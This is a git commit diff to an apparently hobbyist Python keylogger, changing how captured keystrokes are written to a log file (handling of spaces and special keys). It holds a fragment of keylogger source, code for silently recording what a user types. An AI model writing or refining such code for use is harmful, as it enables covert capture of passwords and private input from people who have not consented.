2ecbfe337582777c6aee9a0e2688acd0facc414c
notChewy1324 <40218645+notChewy1324@users.noreply.github.com>
2020-05-06 23:17:34 -0400

    Updated Logic

--- KeyLogger.py
+++ KeyLogger.py
@@ -21,10 +21,9 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
+                f.write('  ')
+            elif k.find("key") == -1:
                 f.write(k)
-            f.write(str(key))
 
 def on_release(key):
     if key == Key.esc:
